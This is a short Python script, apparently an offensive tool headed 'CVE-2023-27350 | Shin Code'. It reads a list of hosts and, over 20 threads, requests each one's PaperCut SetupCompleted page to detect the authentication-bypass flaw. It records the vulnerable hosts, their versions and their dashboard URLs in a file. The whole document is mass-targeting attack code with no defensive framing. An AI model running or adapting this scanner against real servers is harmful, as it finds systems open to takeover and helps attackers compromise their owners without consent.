import requests,re,os,sys
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore,Style, init
init(autoreset=True)


r = Fore.RED + Style.BRIGHT
b = Fore.BLUE + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL


head = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'keep-alive',
        # 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check; slimstat_tracking_code=3386.b77ee445be809a12d617d72914d52783',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
    }
    
def papercut(url):
	urle = 'http://'+url
	try:
		s = requests.Session()
		resp = s.get(urle+'/app?service=page/SetupCompleted',headers=head,timeout=10).content
		if '<span class="product">' in resp or '<input type="hidden" name="service" value="direct/1/SetupCompleted/$Form"/>' in resp:
			regex_version = re.findall('<span>(.*?)</span>',resp)[1]
			print(y + '[+]' +o+ urle + ' ' +g+ '-' + ' [Valid] ' +o+ '-' +b+ ' [Version]: ' +o+ regex_version)
			open('paper_valid.txt','a').write('[+] Version: ' + regex_version + '\n[+] Valid: ' + url + '/app?service=page/SetupCompleted' + '\n[+] Dashboard: ' + url + '/app?service=page/Dashboard\n\n')
		else:
			print(y + '[+]' +o+ urle + ' ' +r+ '-' + ' [Not Vuln] ' +o)
			
	except:
		pass
	pass

if __name__ == '__main__':
	os.system('cls' if os.name == 'nt' else 'clear')
	print "{} [CVE-2023-27350] | {}Shin Code\n".format(y,c)
	url = open(raw_input('List:~# '),'r').read().replace('http://','').replace('https://','').splitlines()
	pool = ThreadPool(int(20))
	pool.map(papercut, url)
	pool.close()
	pool.join()
